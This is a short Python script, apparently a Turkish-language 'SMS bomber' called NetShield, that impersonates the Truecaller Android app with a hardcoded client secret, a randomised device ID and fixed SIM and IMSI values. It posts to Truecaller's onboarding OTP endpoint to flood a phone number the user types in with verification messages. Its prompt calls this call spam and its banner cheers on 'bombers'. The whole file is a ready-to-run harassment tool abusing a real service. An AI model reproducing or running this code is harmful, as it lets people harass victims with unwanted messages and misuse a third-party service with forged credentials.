import requests
import random
import hashlib

def send_spam(phone_number):
    gigk = ''.join(random.choice('123456789') for i in range(10))
    md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
    
    headers = {
        "Host": "account-asia-south1.truecaller.com",
        "Content-Type": "application/json; charset=UTF-8",
        "Content-Length": "680",
        "Accept-Encoding": "gzip",
        "User-Agent": "Truecaller/12.34.8 (Android;8.1.2)",
        "ClientSecret": "lvc22mp3l1sfv6ujg83rd17btt"
    }
    
    url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
    
    data = {
        "countryCode": "EG",
        "dialingCode": 20,
        "installationDetails": {
            "app": {
                "buildVersion": 8,
                "majorVersion": 12,
                "minorVersion": 34,
                "store": "GOOGLE_PLAY"
            },
            "device": {
                "deviceId": md5,
                "language": "ar",
                "manufacturer": "Xiaomi",
                "mobileServices": ["GMS"],
                "model": "Redmi Note 8A Prime",
                "osName": "Android",
                "osVersion": "7.1.2",
                "simSerials": [
                    "8920022021714943876f",
                    "8920022022805258505f"
                ]
            }
        },
        "language": "ar",
        "sims": [
            {
                "imsi": "602022207634386",
                "mcc": "602",
                "mnc": "2",
                "operator": "Vodafone"
            },
            {
                "imsi": "602023133590849",
                "mcc": "602",
                "mnc": "2",
                "operator": "Vodafone"
            }
        ],
        "storeVersion": {
            "buildVersion": 8,
            "majorVersion": 12,
            "minorVersion": 34
        },
        "phoneNumber": phone_number,
        "region": "region-2",
        "sequenceNo": 1
    }
    
    response = requests.post(url, headers=headers, json=data)
    
    if response.status_code == 200:
        print("\nGönderildi")
    else:
        print("\nHata")

def print_banner():
    banner = """
 _   _      _   ____  _     _      _     _
| \ | | ___| |_/ ___|| |__ (_) ___| | __| |
|  \| |/ _ \ __\___ \| '_ \| |/ _ \ |/ _` |
| |\  |  __/ |_ ___) | | | | |  __/ | (_| |
|_| \_|\___|\__|____/|_| |_|_|\___|_|\__,_|
                                          
    """
    print(banner)

print("\033[1;37;40m")  # Set text color to white and background color to black
print_banner()
print("\n\033[1;37;40mHoş geldiniz\n")  # Hoş geldiniz yazısı
print("\033[1;31mNetShield TARAFINDAN\n")
print("\033[1;32m BY OfmeTr")
print("\033[1;33m İyi Bomberlar")

phone_number = input("\n\033[1;34mARAMA SPAMI GÖNDERECEĞİN NUMARAYI GİR\n\nÖRNEĞİN (+905555555555): ")
send_spam(phone_number)
